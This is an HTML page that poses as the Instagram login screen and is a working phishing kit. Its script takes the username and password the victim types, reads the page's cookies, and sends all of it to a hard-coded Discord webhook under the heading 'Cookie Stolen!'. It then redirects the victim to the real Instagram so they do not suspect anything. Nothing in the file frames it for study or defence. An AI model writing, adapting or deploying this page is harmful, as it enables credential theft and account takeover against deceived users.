<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        .login-container {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 350px;
            text-align: center;
        }
        h2 {
            color: #262626;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-weight: bold;
        }
        button:hover {
            background-color: #0081d6;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Instagram</h2>
        <!-- Form to capture login if not logged in -->
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        
        <!-- Hidden form to capture cookie after login -->
        <form id="cookieForm" class="hidden">
            <p>Logging you in...</p>
        </form>
    </div>

    <script>
        // REPLACE WITH YOUR NEW WEBHOOK URL
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1576100925183885395/1BSb5AqGSairin1gG3zfX1Rfks2jUO00uRnmy4MvIQIf9ywuwGntpFRYRjQ4FS4XOVAl";

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // 1. Capture the credentials first (optional, but good to have)
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // 2. Hide the form and show loading
            document.getElementById('loginForm').classList.add('hidden');
            document.getElementById('cookieForm').classList.remove('hidden');

            // 3. Wait a second for Instagram to set the session cookie
            setTimeout(() => {
                stealCookies(username, password);
            }, 1000);
        });

        async function stealCookies(user, pass) {
            try {
                // Get all cookies
                const cookies = document.cookie;
                
                // Send to Discord
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: `🔓 **Cookie Stolen!**\n\n**User:** ${user}\n**Password:** ${pass}\n\n**Cookies:**\n\`\`\`${cookies}\`\`\``
                    })
                });

                // 4. Redirect to real Instagram so they don't suspect
                window.location.href = 'https://www.instagram.com/';
            } catch (error) {
                console.error('Error stealing cookies:', error);
                // Still redirect even if error
                window.location.href = 'https://www.instagram.com/';
            }
        }
    </script>
</body>
</html>
